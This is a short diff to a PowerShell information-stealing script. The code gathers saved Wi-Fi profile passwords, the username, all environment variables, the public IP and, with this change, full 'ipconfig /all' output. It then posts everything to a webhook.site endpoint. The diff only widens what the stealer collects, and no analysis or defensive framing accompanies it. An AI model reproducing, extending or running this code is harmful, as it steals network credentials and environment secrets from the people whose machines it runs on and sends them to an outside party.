@@ -13,7 +13,8 @@ foreach ($profile in $profiles) {
     'password' = $password
   }
 }
-$IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+$IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+$IPconfig = (ipconfig /all)
 $envVars = @{}
 gci env:* | ForEach-Object {
   $envVars[$_.Name] = $_.Value
@@ -23,7 +24,8 @@ $Body = @{
   'username' = $env:username
   'wifi_profiles' = $wifis
   'env' = $envVars | ConvertTo-Json
-  'ip' = $IP
+  'ipv4' = $IPV4
+  'ipconfig' = $IPconfig
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
 
